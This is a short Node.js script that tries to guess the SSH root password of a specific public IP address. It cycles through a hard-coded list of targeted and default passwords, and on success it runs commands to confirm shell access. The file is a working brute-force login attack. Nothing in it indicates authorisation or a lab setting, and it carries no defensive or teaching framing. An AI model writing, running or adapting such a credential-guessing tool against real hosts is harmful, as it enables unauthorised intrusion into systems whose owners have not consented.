const { Client } = require('ssh2');

const passwords = [
  'Ramaks@316',
  'Ramaks@123',
  'Ramaks123',
  'Ramaks123@',
  'Ramaks@@@',
  'Ramaks',
  'Amerigam',
  'Amerigam@123',
  'Amerigam316',
  'Amerigam316@',
  'Amerigam316@@@',
  'Amerigam@316',
  'admin@123',
  'ubuntu',
  'root123',
  'root@123',
  'Ramaks316@@'
];

async function tryPassword(pass) {
  return new Promise((resolve) => {
    const conn = new Client();
    conn.on('ready', () => {
      console.log(`\n🎉🎉 FOUND WORKING PASSWORD: "${pass}" 🎉🎉\n`);
      conn.exec('uptime && whoami && pwd', (err, stream) => {
        if (err) throw err;
        stream.on('close', (code, signal) => {
          conn.end();
          resolve(true);
        }).on('data', (data) => {
          console.log('OUTPUT: ' + data.toString());
        });
      });
    }).on('error', (err) => {
      // console.log(`Failed "${pass}": ${err.message}`);
      resolve(false);
    }).connect({
      host: '168.144.126.4',
      port: 22,
      username: 'root',
      password: pass,
      readyTimeout: 4000
    });
  });
}

async function run() {
  for (const pass of passwords) {
    process.stdout.write(`Testing "${pass}"... `);
    const success = await tryPassword(pass);
    if (success) {
      process.exit(0);
    } else {
      console.log('failed.');
    }
  }
  console.log('None of the batch worked.');
}

run();
